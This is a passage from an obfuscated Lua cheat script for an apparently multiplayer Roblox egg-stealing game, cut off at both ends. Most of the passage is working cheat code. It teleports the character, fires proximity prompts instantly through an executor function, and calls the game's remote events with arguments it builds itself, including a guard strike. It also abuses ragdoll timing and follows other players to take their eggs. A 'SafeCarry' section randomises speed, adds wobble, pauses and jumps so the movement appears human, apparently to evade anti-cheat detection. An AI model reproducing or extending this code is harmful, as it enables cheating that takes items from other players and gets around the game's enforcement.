				return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
			end
			return false
		end

		local func91

		func91 = function(flag82, param53)
			if str1.Steal.Carrying then
				return true
			end
			local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
			if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				return false
			end
			local n15 = 0

			while n15 < 1 do
				if func61(param53) or str1.Steal.Carrying then
					return str1.Steal.Carrying == true
				end
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
				local records = ok and type(result) == "table" and result.Records or nil

				if type(records) == "table" then
					local flag83 = false

					for _, record in pairs(records) do
						if type(record) == "table" and record.Uid == flag82 and (record.State == "Slot" or record.State == "Dropped") then
							flag83 = true
							break
						end
					end

					if not flag83 then
						return str1.Steal.Carrying == true
					end
				end

				n15 += task.wait(0.3)
			end

			return str1.Steal.Carrying == true
		end

		local func92

		local function func93(part5)
			local flag84 = str1.Root()
			local position = typeof(part5.CFrame) == "CFrame" and part5.CFrame.Position or nil
			if not flag84 or not position then
				return math.huge
			end
			return (flag84.Position - position).Magnitude
		end

		func92 = function(list14)
			local value64, value65, value66 = ipairs(list14)
			local huge = math.huge
			local value67 = nil

			for _, value68 in value64, value65, value66 do
				local flag85 = func93(value68)

				if flag85 < huge then
					huge = flag85
					value67 = value68
				end
			end

			return value67, huge
		end

		local n15
		n15 = 20
		local n16
		n16 = 90
		local func94, stealHome, func95, func96, func97, n17

		do
			local n18 = 6

			func94 = function(num16, param54, flag86, flag87, flag88, callback3)
				func74()
				local flag89 = str1.Root()
				if not flag89 then
					return false
				end
				local character = localPlayer.Character
				local position = flag89.Position
				local tbl88 = {}
				local position2 = nil
				local value69 = nil
				local value70 = nil
				local n19 = 0

				local function func98()
					if flag87 ~= nil then
						return true
					end
					return true
				end

				local function func99(param55)
					n19 += param55
					if func61(param54) then
						value69 = false
						return nil
					end

					if flag86 and not str1.Steal.Carrying then
						value69 = false
						value70 = "dropped"
						return nil
					end

					if callback3 then
						local result15 = callback3()

						if result15 then
							value69 = false
							value70 = result15
							return nil
						end
					end

					local flag90 = str1.Root()

					if not flag90 or n19 >= 25 or localPlayer.Character ~= character then
						value69 = false
						value70 = "respawned"
						return nil
					end

					return flag90
				end

				local connection = RunService.Heartbeat:Connect(function(deltaTime)
					if value69 ~= nil or func98() or str1.AntiGuard.Busy then
						return
					end
					local flag91 = func99(deltaTime)
					if not flag91 then
						return
					end

					if n13 < (flag91.Position - position).Magnitude then
						if flag88 then
							value69 = false
							value70 = "displaced"
							return
						end

						position = flag91.Position
					end

					local n20 = (flag87 or 400) * (os.clock() < (str1.SafeCarry.SlowUntil or 0) and str1.SafeCarry.SlowFactor or 1)
					local n21

					if str1.SafeCarry.Enabled and str1.SafeCarry.Pace then
						n21 = math.min(n20, str1.SafeCarry.Pace())
					else
						n21 = n20
					end

					local n22 = num16 - position
					local n23 = n21 * deltaTime
					local flag92 = n22.Magnitude <= math.max(n23, 0.05)
					position = flag92 and num16 or position + n22.Unit * n23
					local vector = Vector3.new(n22.X, 0, n22.Z)
					local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or flag91.CFrame.Rotation

					pcall(function()
						flag91.CFrame = CFrame.new(position) * cframe
						flag91.AssemblyLinearVelocity = Vector3.zero
						flag91.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag92 then
						value69 = true
					end
				end)

				local connection2 = RunService.PreSimulation:Connect(function(deltaTime)
					if value69 ~= nil or not func98() or str1.AntiGuard.Busy then
						return
					end
					local flag93 = func99(deltaTime)
					if not flag93 then
						return
					end
					local n20 = (flag87 or 400) * (os.clock() < (str1.SafeCarry.SlowUntil or 0) and str1.SafeCarry.SlowFactor or 1)
					local n21

					if str1.SafeCarry.Enabled and str1.SafeCarry.Pace then
						n21 = math.min(n20, str1.SafeCarry.Pace())
					else
						n21 = n20
					end

					if flag88 and position2 and (flag93.Position - position2).Magnitude > n13 + n21 * deltaTime then
						value69 = false
						value70 = "displaced"
						return
					end

					if func72(flag93, num16, n21, deltaTime, tbl88) then
						value69 = true
					end

					position2 = flag93.Position
					position = flag93.Position
				end)

				while value69 == nil do
					RunService.Heartbeat:Wait()
				end

				connection:Disconnect()
				connection2:Disconnect()

				if func98() and not value69 then
					func73()
				end

				if value69 then
					func76(num16, flag87 ~= nil)
				end

				return value69, value70
			end

			local tbl89 = {
				{
					Path = { "GearGiver_Slap", "Podium" },
					Offset = Vector3.new(-16.415, 21.072, -6.106),
				},
				{
					Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
					Offset = Vector3.new(-26.776, 1.75, 18.665),
				},
				{
					Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
					Offset = Vector3.new(-26.776, 1.75, 18.665),
				},
			}

			stealHome = function()
				for _, item35 in ipairs(tbl89) do
					local obj22 = workspace

					for _, item36 in ipairs(item35.Path) do
						obj22 = obj22 and obj22:FindFirstChild(item36) or nil
					end

					if obj22 and obj22:IsA("BasePart") then
						return obj22.CFrame:PointToWorldSpace(item35.Offset)
					end
				end

				return Vector3.new(528.7, 70.57, -364.11)
			end

			str1.StealHome = stealHome

			str1.InsideBase = function(obj)
				if not obj then
					obj = str1.Root()
					obj = obj and obj.Position
				end

				if obj == nil then
					return false
				end
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				return obj.X < (world and world:IsA("BasePart") and world.Position.X or 552)
			end

			local function func100(num17)
				if str1.AntiGuard.Busy then
					return false
				end
				local character = localPlayer.Character
				local flag94 = str1.Root()
				if not character or not flag94 then
					return false
				end
				local rotation = flag94.CFrame.Rotation
				local cFrame = CFrame.new(num17) * rotation

				pcall(function()
					character:PivotTo(cFrame)
				end)

				if (flag94.Position - num17).Magnitude > 3 then
					pcall(function()
						flag94.CFrame = cFrame
					end)
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						pcall(function()
							descendant.AssemblyLinearVelocity = Vector3.zero
							descendant.AssemblyAngularVelocity = Vector3.zero
						end)
					end
				end

				return true
			end

			local function func101(num18)
				if str1.AntiGuard.Busy then
					return
				end
				local character = localPlayer.Character
				local num19 = str1.Root()
				if not character or not num19 or not num18 then
					return
				end

				if (num19.Position - num18).Magnitude > 6 then
					func100(num18)
					return
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") and descendant ~= num19 and (descendant.Position - num19.Position).Magnitude > 12 then
						pcall(function()
							descendant.CFrame = num19.CFrame
							descendant.AssemblyLinearVelocity = Vector3.zero
						end)
					end
				end
			end

			local function func102(param56, param57)
				local n19 = 0

				while true do
					if not (n19 < n18) then
						return not func61(param56)
					else
						if func61(param56) then
							break
						end
						local character = localPlayer.Character
						local result16 = func90()

						if not result16 and character then
							for _, descendant in ipairs(character:GetDescendants()) do
								if descendant:IsA("Constraint") and string.find(descendant.Name, "RagdollConstraint", 1, true) then
									result16 = true
									break
								end
							end
						end

						if not result16 then
							return not func61(param56)
						end
						func101(param57)
						n19 += RunService.Heartbeat:Wait()
					end
				end

				return false
			end

			local function func103(childName2)
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("GuardAreas")
				local areaId = world and childName2 and childName2.AreaId and world:FindFirstChild(childName2.AreaId)
				return areaId and areaId:FindFirstChild("Guard") or nil
			end

			func95 = function(param58)
				local obj23 = func103(param58)
				return obj23 ~= nil and obj23:GetAttribute("GuardState") == "Sleeping"
			end

			local n19 = 3

			func96 = function(part6)
				local obj24 = func103(part6)
				local position = typeof(part6.CFrame) == "CFrame" and part6.CFrame.Position or nil
				if not obj24 or not position then
					return nil, nil
				end

				local ok, result = pcall(function()
					return obj24:GetPivot().Position
				end)

				if not ok then
					return nil, nil
				end
				local vector = Vector3.new(position.X - result.X, 0, position.Z - result.Z)
				if vector.Magnitude < 0.1 then
					return nil, nil
				end
				local n20 = result + vector.Unit * n19
				return Vector3.new(n20.X, position.Y + 3, n20.Z), result
			end

			local function func104(param59, param60)
				local tbl90 = { Landed = false, Destination = param60 }
				local antiGuard = str1.AntiGuard
				antiGuard.HitArms = antiGuard.HitArms + 1
				str1.AntiGuard.HitArmedAt = os.clock()

				tbl90.Link = localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
					if tbl90.Landed or func61(param59) then
						return
					end
					local num20 = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
					if not num20 or num20 <= workspace:GetServerTimeNow() then
						return
					end
					local num21 = str1.Root()
					if not num21 then
						return
					end
					tbl90.Landed = true
					func74()
					str1.SafeCarry.JumpDistance = (tbl90.Destination - num21.Position).Magnitude
					str1.SafeCarry.JumpAt = os.clock()

					pcall(function()
						num21.CFrame = CFrame.new(tbl90.Destination)
						num21.AssemblyLinearVelocity = Vector3.zero
					end)
				end)

				tbl90.Stop = function()
					if tbl90.Link then
						tbl90.Link:Disconnect()
						tbl90.Link = nil
						str1.AntiGuard.HitArms = math.max(0, str1.AntiGuard.HitArms - 1)
					end
				end

				return tbl90
			end

			func97 = function(param61, flag95, callback4)
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end

				local n20 = 0
				local value71 = nil

				while not flag95.Landed and n20 < n15 do
					if func61(param61) then
						break
					end

					if callback4 then
						callback4(flag95)
					end

					if not str1.Steal.Carrying then
						local num22 = value71 or n20
						if n20 - num22 > 1 then
							break
						end
						value71 = num22
					end

					n20 += RunService.Heartbeat:Wait()
				end

				flag95.Stop()
				return flag95.Landed
			end

			n17 = 20

			local function func105(part7, param62, param63, param64)
				local position = typeof(part7.CFrame) == "CFrame" and part7.CFrame.Position or nil
				if not position then
					return false
				end
				local n20 = 0
				local huge = math.huge

				while n20 < param63 do
					if func61(param62) then
						return false
					end

					if str1.Steal.Carrying and not str1.Steal.WrongEgg(part7.Uid) then
						return true
					end

					if huge >= 0.1 then
						local uid5 = func80(part7.Uid, position)

						if uid5 then
							pcall(function()
								uid5.HoldDuration = 0
							end)

							if typeof(fireproximityprompt) == "function" then
								pcall(fireproximityprompt, uid5)
							end
						else
							func83(part7.Uid)
						end

						huge = 0
					end

					if param64 then
						func101(param64)
					end

					local result = RunService.Heartbeat:Wait()
					n20 += result
					huge += result
				end

				return str1.Steal.Carrying == true
			end

			local function func106(part8, param65, param66, part9)
				local position = typeof(part8.CFrame) == "CFrame" and part8.CFrame.Position or nil
				if not position then
					return false
				end
				local n20 = position + Vector3.new(0, 3, 0)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid and character:FindFirstChildWhichIsA("Tool") then
					pcall(function()
						humanoid:UnequipTools()
					end)
				end

				if param66 then
					func76(n20, true)
					flag50 = "Waiting to stand up"
					if not func102(param65, n20) then
						return false
					end

					if str1.SafeCarry.Enabled and part9 == nil and str1.SafeCarry.Settle then
						if not str1.SafeCarry.Settle(param65, part8) then
							return false
						end
					end
				else
					flag50 = "Jumping to the egg"
					local num23 = str1.Root()

					if num23 and (n20 - num23.Position).Magnitude <= n16 then
						pcall(function()
							local rotation = num23.CFrame.Rotation
							num23.CFrame = CFrame.new(n20) * rotation
							num23.AssemblyLinearVelocity = Vector3.zero
							num23.AssemblyAngularVelocity = Vector3.zero
						end)
					elseif not func94(n20, param65, nil, 400) then
						return false
					end
				end

				if func61(param65) then
					return false
				end
				local flag96 = part9 and typeof(part9.CFrame) == "CFrame"
				local value72 = nil

				if flag96 then
					value72 = func104(param65, part9.CFrame.Position + Vector3.new(0, 3, 0))
				end

				local str8 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local uid6 = type(part8.Uid) == "string" and string.sub(part8.Uid, 1, #str8) == str8 and string.match(part8.Uid, "_([%w ]+:Slot_%d+)$") or nil
				part9 = part9 and uid6
				local flag97 = false

				if part9 then
					local eggState = tbl1.EggState

					if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
						flag50 = "Taking the starter egg"

						task.spawn(function()
							pcall(eggState.CarryFieldEgg, part8.Uid, uid6)
						end)

						local n21 = 0

						while not str1.Steal.Carrying and n21 < 0.8 do
							if func61(param65) then
								return false
							end
							n21 += RunService.Heartbeat:Wait()
						end

						flag97 = str1.Steal.Carrying == true
					end
				end

				if not flag97 then
					flag50 = "Taking the egg"
					flag97 = func89(part8, param65)

					if not flag97 and not func61(param65) then
						func94(n20, param65, nil, 400)
						flag97 = func89(part8, param65)
					end
				end

				if not flag97 and not func91(part8.Uid, param65) then
					if value72 then
						value72.Stop()
					end

					tbl80[part8.Uid] = os.clock() + n10
					flag50 = "That egg would not come free"
					return false
				end

				if value72 then
					local reGuardPatrolForestStrike = networking:FindFirstChild("RE/GuardPatrol/ForestStrike")
					local obj25 = func103(part8) or func103({ AreaId = "Forest" })
					local humanoidRootPart = obj25 and obj25:FindFirstChild("HumanoidRootPart")

					if reGuardPatrolForestStrike and reGuardPatrolForestStrike:IsA("RemoteEvent") and humanoidRootPart then
						flag50 = "Calling the guard strike"

						pcall(function()
							reGuardPatrolForestStrike:FireServer({ EggUid = part8.Uid, GuardCFrame = humanoidRootPart.CFrame })
						end)
					end
				end

				str1.Steal.LastFinishedAt = os.clock()
				return true, value72
			end

			local huge = math.huge
			local huge2 = math.huge

			local function func107(num24, param67, param68)
				local value73 = nil
				local value74 = nil

				for _, child in ipairs(workspace:GetChildren()) do
					if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
						local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

						if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
							local magnitude = (child.Position - num24).Magnitude

							if magnitude < param67 then
								param67 = magnitude
								value73 = carryAreaEgg
								value74 = child
							end
						end
					end
				end

				if value73 and value74 and type(param68) == "string" and not func79(value74, param68, num24) then
					return nil
				end
				return value73, value74
			end

			local function func108(childName3)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				local obj26 = workspace:FindFirstChild(childName3) or areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(childName3)
				if not obj26 then
					return nil
				end

				local ok, result = pcall(function()
					return obj26:GetPivot().Position
				end)

				return ok and result or nil
			end

			local function func109(flag98)
				local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
				if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
					return nil
				end
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
				local records = ok and type(result) == "table" and result.Records or nil
				if type(records) ~= "table" then
					return nil
				end

				for _, record in pairs(records) do
					if type(record) == "table" and record.Uid == flag98 and typeof(record.BottomCFrame) == "CFrame" then
						return record.BottomCFrame.Position, true
					end
				end

				return nil, true
			end

			local function func110(childName4)
				local obj27 = workspace:FindFirstChild(childName4)
				if not obj27 then
					return false
				end

				for _, descendant in ipairs(obj27:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, result, result2 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						if ok then
							for _, item37 in ipairs({ result, result2 }) do
								if typeof(item37) == "Instance" and not item37:IsDescendantOf(obj27) then
									local model = item37:FindFirstAncestorOfClass("Model")
									if model and model ~= localPlayer.Character and Players:GetPlayerFromCharacter(model) then
										return true
									end
								end
							end
						end
					end
				end

				return false
			end

			local function func111(param69, param70)
				local state = 1
				local value75, value76, carryUid, n20, vector, connection, n21, n22, huge3, num25, num26, n23, huge4, flag99, num27, num28, value77, value78, now, flag100, n24, flag101, value79

				while true do
					if state == 1 then
						value75 = param69
						value76 = param70

						if value76 then
							state = 3
						else
							state = 2
						end
					elseif state == 2 then
						carryUid = str1.Steal.CarryUid
						state = 4
					elseif state == 3 then
						carryUid = value76
						state = 4
					elseif state == 4 then
						if type(carryUid) ~= "string" then
							state = 51
						else
							state = 5
						end
					elseif state == 5 then
						func74()
						flag50 = "Following the egg"
						n20 = nil
						vector = Vector3.zero

						connection = RunService.PreSimulation:Connect(function(deltaTime)
							local num29 = str1.Root()
							if not num29 or not n20 or str1.Steal.Carrying or func61(value75) then
								return
							end

							if func75() then
								if not str1.SafeCarry.Enabled and (num29.Position - n20).Magnitude > 2 then
									func100(n20)
								end

								return
							end

							local n25 = math.max(deltaTime, 0.0041666666666666666)
							local n26 = vector + (n20 - num29.Position) / math.max(0.08, n25)
							local enabled = str1.SafeCarry.Enabled and str1.SafeCarry.Pace() or n8 + vector.Magnitude

							if enabled < n26.Magnitude then
								n26 = n26.Unit * enabled
							end

							local assemblyLinearVelocity = n26 + Vector3.new(0, workspace.Gravity * n25 * 0.5, 0)

							pcall(function()
								num29.AssemblyLinearVelocity = assemblyLinearVelocity
								num29.AssemblyAngularVelocity = Vector3.zero
							end)
						end)

						n21 = 0
						n22 = 0
						huge3 = math.huge
						num25 = nil
						num26 = nil
						n23 = 0
						huge4 = math.huge
						state = 6
					elseif state == 6 then
						flag99 = false

						if not (n21 < huge2) then
							state = 48
						else
							state = 7
						end
					elseif state == 7 then
						if func61(value75) then
							state = 48
						else
							state = 8
						end
					elseif state == 8 then
						if str1.Steal.Carrying then
							state = 9
						else
							state = 12
						end
					elseif state == 9 then
						if str1.Steal.WrongEgg(carryUid) then
							state = 11
						else
							state = 10
						end
					elseif state == 10 then
						flag99 = true
						state = 48
					elseif state == 11 then
						flag50 = "Picked up the wrong egg, dropped it"
						state = 12
					elseif state == 12 then
						num27 = str1.Root()

						if not num27 then
							state = 48
						else
							state = 13
						end
					elseif state == 13 then
						num28 = func108(carryUid)

						if num28 then
							state = 22
						else
							state = 14
						end
					elseif state == 14 then
						if huge3 >= 0.5 then
							state = 15
						else
							state = 23
						end
					elseif state == 15 then
						value77, value78 = func109(carryUid)

						if value77 then
							state = 21
						else
							state = 16
						end
					elseif state == 16 then
						huge3 = 0

						if value78 then
							state = 18
						else
							state = 17
						end
					elseif state == 17 then
						num28 = value77
						state = 23
					elseif state == 18 then
						n22 += 1

						if not (n22 >= 4) then
							state = 20
						else
							state = 19
						end
					elseif state == 19 then
						flag50 = "The egg is gone"
						state = 48
					elseif state == 20 then
						num28 = value77
						state = 23
					elseif state == 21 then
						n22 = 0
						huge3 = 0
						num28 = value77
						state = 23
					elseif state == 22 then
						n22 = 0
						state = 23
					elseif state == 23 then
						if num28 then
							state = 24
						else
							state = 33
						end
					elseif state == 24 then
						now = os.clock()

						if num25 then
							state = 26
						else
							state = 25
						end
					elseif state == 25 then
						flag100 = num25
						state = 27
					elseif state == 26 then
						flag100 = num26
						state = 27
					elseif state == 27 then
						if flag100 then
							state = 28
						else
							state = 29
						end
					elseif state == 28 then
						flag100 = now > num26
						state = 29
					elseif state == 29 then
						if flag100 then
							state = 30
						else
							state = 32
						end
					elseif state == 30 then
						n24 = (num28 - num25) / math.max(now - num26, 0.0041666666666666666)

						if not (n24.Magnitude < 3000) then
							state = 32
						else
							state = 31
						end
					elseif state == 31 then
						vector = vector:Lerp(n24, 0.3)
						state = 32
					elseif state == 32 then
						n20 = num28 + Vector3.new(0, 3, 0)
						num25 = num28
						num26 = now
						state = 33
					elseif state == 33 then
						if not (n23 >= 0.4) then
							state = 37
						else
							state = 34
						end
					elseif state == 34 then
						if func110(carryUid) then
							state = 36
						else
							state = 35
						end
					elseif state == 35 then
						flag50 = "Egg dropped, taking it back"
						n23 = 0
						state = 37
					elseif state == 36 then
						flag50 = "Another player has the egg, following it until it drops"
						n23 = 0
						state = 37
					elseif state == 37 then
						if n20 then
							state = 39
						else
							state = 38
						end
					elseif state == 38 then
						flag101 = n20
						state = 40
					elseif state == 39 then
						flag101 = (n20 - num27.Position).Magnitude <= n17
						state = 40
					elseif state == 40 then
						if flag101 then
							state = 41
						else
							state = 42
						end
					elseif state == 41 then
						flag101 = huge4 >= 0.1
						state = 42
					elseif state == 42 then
						if flag101 then
							state = 43
						else
							state = 47
						end
					elseif state == 43 then
						value79 = func107(n20 - Vector3.new(0, 3, 0), 6, carryUid)

						if value79 then
							state = 45
						else
							state = 44
						end
					elseif state == 44 then
						task.spawn(func83, carryUid)
						huge4 = 0
						state = 47
					elseif state == 45 then
						pcall(function()
							value79.HoldDuration = 0
						end)

						huge4 = 0

						if typeof(fireproximityprompt) ~= "function" then
							state = 47
						else
							state = 46
						end
					elseif state == 46 then
						pcall(fireproximityprompt, value79)
						state = 47
					elseif state == 47 then
						local result = RunService.Heartbeat:Wait()
						n21 += result
						huge4 += result
						huge3 += result
						n23 += result
						state = 6
					elseif state == 48 then
						connection:Disconnect()
						func73()

						if flag99 then
							state = 50
						else
							state = 49
						end
					elseif state == 49 then
						flag99 = str1.Steal.Carrying == true
						state = 50
					elseif state == 50 then
						return flag99
					elseif state == 51 then
						return false
					end
				end
			end

			local function func112(part10, param71)
				local position = typeof(part10.CFrame) == "CFrame" and part10.CFrame.Position or nil
				if not position then
					return false
				end

				if str1.InsideBase() and not str1.InsideBase(position) then
					local result17 = stealHome()

					if result17 then
						flag50 = "Leaving the base through the safe zone"
						if not func94(result17 + Vector3.new(0, 3, 0), param71, nil, 400) then
							return false
						end
					end
				end

				flag50 = "Flying to the egg"
				if not func94(position + Vector3.new(0, 3, 0), param71, nil, 400) then
					return false
				end
				flag50 = "Taking the egg"
				local flag102 = func105(part10, param71, 0.6, nil)

				if not flag102 and not func61(param71) then
					flag102 = func89(part10, param71)
				end

				if not flag102 and not func91(part10.Uid, param71) then
					tbl80[part10.Uid] = os.clock() + n10
					return false
				end
				str1.Steal.LastFinishedAt = os.clock()
				return true
			end

			local tbl91 = { Uid = nil, Freed = nil, Token = nil }
			local n20 = 3

			local function func113()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("GuardAreas")
				local num30 = str1.Root()
				if not world or not num30 then
					return nil
				end
				local userId3 = tostring(localPlayer.UserId)
				local carryAreaId = str1.Steal.CarryAreaId and func103({ AreaId = tostring(str1.Steal.CarryAreaId) }) or nil
				local huge3 = math.huge
				local value80 = nil

				for _, child in ipairs(world:GetChildren()) do
					local guard = child:FindFirstChild("Guard")

					if guard then
						if tostring(guard:GetAttribute("TargetPlayer")) == userId3 or tostring(guard:GetAttribute("WakeTargetPlayer")) == userId3 then
							return guard
						end

						local ok, result = pcall(function()
							return guard:GetPivot().Position
						end)

						if ok then
							local magnitude = (result - num30.Position).Magnitude

							if magnitude < huge3 then
								value80 = guard
								huge3 = magnitude
							end
						end
					end
				end

				return carryAreaId or value80
			end

			local function func114(param72, param73, num31)
				local result18 = func113()
				if not result18 then
					return false
				end
				local flag103 = func104(param72, num31 + Vector3.new(0, 3, 0))
				local n21 = 0

				while true do
					if not flag103.Landed and n21 < n15 and not func61(param72) then
						local ok, result = pcall(function()
							return result18:GetPivot().Position
						end)

						local num32 = str1.Root()

						if not (not ok or not num32) then
							if (result - num32.Position).Magnitude > n19 + 5 then
								local vector = Vector3.new(num32.Position.X - result.X, 0, num32.Position.Z - result.Z)
								local n22 = result + (vector.Magnitude > 0.1 and vector.Unit * n19 or Vector3.zero)

								func94(Vector3.new(n22.X, result.Y + 3, n22.Z), param72, nil, 400, true, function()
									if flag103.Landed then
										return "hit"
									end
									return nil
								end)
							end

							n21 += RunService.Heartbeat:Wait()
							continue
						end
					end

					break
				end

				flag103.Stop()
				if not flag103.Landed then
					return false
				end
				return func111(param72, param73)
			end

			str1.SafeCarry.Dangers = {}
			str1.SafeCarry.DangerAt = 0

			str1.SafeCarry.RefreshDangers = function()
				local safeCarry = str1.SafeCarry
				local dangerAt = safeCarry.DangerAt
				if os.clock() - dangerAt < 1 then
					return safeCarry.Dangers
				end
				safeCarry.DangerAt = os.clock()
				local dangers = {}

				local function func115(part11)
					local ok, result, result2 = pcall(function()
						if part11:IsA("Model") then
							return part11:GetBoundingBox()
						end

						if part11:IsA("BasePart") then
							return part11.CFrame, part11.Size
						end
					end)

					if ok and result and result2 then
						local n21 = Vector3.new(math.abs(result2.X), 0, math.abs(result2.Z)) * 0.5
						local num33 = (result - result.Position):VectorToWorldSpace(n21)
						local x = n21.X
						local z = n21.Z
						local n22 = math.max(math.abs(num33.X), x, z)
						local x2 = n21.X
						local z2 = n21.Z
						local n23 = math.max(math.abs(num33.Z), x2, z2)

						table.insert(dangers, {
							MinX = result.Position.X - n22,
							MaxX = result.Position.X + n22,
							MinZ = result.Position.Z - n23,
							MaxZ = result.Position.Z + n23,
							Name = part11.Name,
						})
					end
				end

				local function func116(flag104)
					if flag104 == "ScrambleLocalVisuals" or flag104 == "DrScrambleEvent" then
						return false
					end
					local lowered3 = string.lower(flag104)
					return string.find(lowered3, "portal", 1, true) or string.find(lowered3, "teleport", 1, true) or string.find(lowered3, "mech", 1, true) or string.find(lowered3, "arena", 1, true) or string.find(lowered3, "scramble", 1, true)
				end

				for _, child in ipairs(workspace:GetChildren()) do
					if (child:IsA("Model") or child:IsA("BasePart") or child:IsA("Folder")) and func116(child.Name) then
						if child:IsA("Folder") then
							for _, child2 in ipairs(child:GetChildren()) do
								func115(child2)
							end
						else
							func115(child)
						end
					end
				end

				local world = workspace:FindFirstChild("World")
				world = world and world:FindFirstChild("Build")

				if world then
					for _, child in ipairs(world:GetChildren()) do
						if func116(child.Name) then
							for _, child2 in ipairs(child:GetChildren()) do
								func115(child2)
							end
						end
					end
				end

				safeCarry.Dangers = dangers
				return dangers
			end

			str1.SafeCarry.Avoid = function(obj, param74)
				for _, refreshDanger in ipairs(str1.SafeCarry.RefreshDangers()) do
					local n21 = refreshDanger.MinX - 12
					local n22 = refreshDanger.MaxX + 12
					local n23 = refreshDanger.MinZ - 12
					local n24 = refreshDanger.MaxZ + 12
					local value81, value82, value83 = ipairs({ { obj.X, param74.X - obj.X, n21, n22 }, { obj.Z, param74.Z - obj.Z, n23, n24 } })
					local flag105 = true
					local n25 = 0
					local n26 = 1

					for _, value84 in value81, value82, value83 do
						local first4 = value84[1]
						local second3 = value84[2]
						local third1 = value84[3]
						local entry3 = value84[4]

						if math.abs(second3) < 1e-06 then
							if first4 < third1 or first4 > entry3 then
								flag105 = false
							end
						else
							local n27 = (third1 - first4) / second3
							local n28 = (entry3 - first4) / second3

							if not (n28 < n27) then
								local value85 = n28
								n28 = n27
								n27 = value85
							end

							local n29 = math.max(n25, n28)
							local n30 = math.min(n26, n27)

							if not (n30 < n29) then
								n26 = n30
								n25 = n29
							else
								flag105 = false
								n26 = n30
								n25 = n29
							end
						end
					end

					if flag105 and not (obj.X >= n21 and obj.X <= n22 and obj.Z >= n23 and obj.Z <= n24) then
						local n27 = n23 - 2
						local n28 = n24 + 2
						local num34 = math.abs(obj.Z - n27) <= math.abs(obj.Z - n28) and n27 or n28

						if num34 < -440 or num34 > -290 then
							num34 = num34 == n27 and n28 or n27
						end

						local num35 = math.abs(obj.X - n21) <= math.abs(obj.X - n22) and n21 or n22

						if math.abs(obj.Z - num34) < 3 then
							num35 = math.abs(param74.X - n21) <= math.abs(param74.X - n22) and n21 or n22
						end

						return Vector3.new(num35, param74.Y, num34), refreshDanger.Name
					end
				end

				return param74, nil
			end

			str1.SafeCarry.NewHuman = function(flag106)
				local safeCarry = str1.SafeCarry
				local laneOffset = safeCarry.LaneOffset
				local num36

				num36 = {
					Clock = 0,
					Factor = 1,
					Target = 1,
					NextShift = 0,
					Phase = math.random() * 3.1415926535897931 * 2,
					Period = 2 + math.random() * 2.5,
					PauseUntil = 0,
					Lane = (math.random() * 2 - 1) * laneOffset,
					Step = function(num37, flag107, flag108)
						num36.Clock = num36.Clock + num37

						if num36.NextShift <= num36.Clock then
							num36.NextShift = num36.Clock + 0.5 + math.random()
							local n21 = math.max(safeCarry.SpeedJitter, 0)

							if flag106 then
								num36.Target = 1 - math.random() * n21
							else
								num36.Target = 1 + (math.random() * 2 - 1) * n21
							end
						end

						num36.Factor = num36.Factor + (num36.Target - num36.Factor) * math.min(num37 * 3, 1)
						local wobble = safeCarry.Wobble
						local n21 = math.sin(num36.Clock * 2 * 3.1415926535897931 / num36.Period + num36.Phase) * wobble
						local flag109 = flag108 and flag107 and safeCarry.JumpsPerMinute > 0
						local flag110

						if flag109 then
							local n22 = safeCarry.JumpsPerMinute / 60 * num37
							flag110 = math.random() < n22
						else
							flag110 = flag109
						end

						if flag110 then
							pcall(function()
								flag107.Jump = true
							end)
						end

						local flag111 = false

						if not flag106 then
							if num36.Clock < num36.PauseUntil then
								flag111 = true
							else
								local flag112 = safeCarry.PausesPerMinute > 0

								if flag112 then
									local n22 = safeCarry.PausesPerMinute / 60 * num37
									flag112 = math.random() < n22
								end

								if flag112 then
									num36.PauseUntil = num36.Clock + 0.3 + math.random() * 0.9
									flag111 = true
								end
							end
						end

						return num36.Factor, num36.Lane + n21, flag111
					end,
				}

				return num36
			end

			str1.SafeCarry.React = function(param75, param76)
				local n21 = math.max(0, math.min(param75, param76))
				local n22 = math.max(param75, param76, 0)
				return n21 + math.random() * (n22 - n21)
			end

			str1.SafeCarry.RunTo = function(obj, param77)
				local safeCarry = str1.SafeCarry
				local position = typeof(obj.CFrame) == "CFrame" and obj.CFrame.Position or nil
				if not position then
					return false
				end
				func74()
